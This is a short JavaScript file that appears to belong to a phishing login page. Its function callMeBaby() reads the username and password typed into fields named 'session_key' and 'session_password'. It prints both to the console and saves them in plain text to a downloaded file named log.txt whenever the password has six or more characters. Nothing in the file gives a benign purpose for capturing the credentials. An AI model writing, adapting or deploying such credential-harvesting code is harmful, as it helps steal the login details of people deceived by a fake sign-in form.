const downloadToFile = (content, filename, contentType) => {
	const a = document.createElement("a");
	const file = new Blob([content], { type: contentType });

	a.href = URL.createObjectURL(file);
	a.download = filename;
	a.click();

	URL.revokeObjectURL(a.href);
};

function callMeBaby() {
	console.log("callMeBaby()");

	const username = document.getElementById("session_key").value;
	const password = document.getElementById("session_password").value;

	if (username !== null && password.length >= 6) {
		console.log(username);
		console.log(password);
		const data = "username: " + username + "\n" + "password: " + password + "\n\n";
        downloadToFile(data, './log.txt', "text/plain");
	}
}
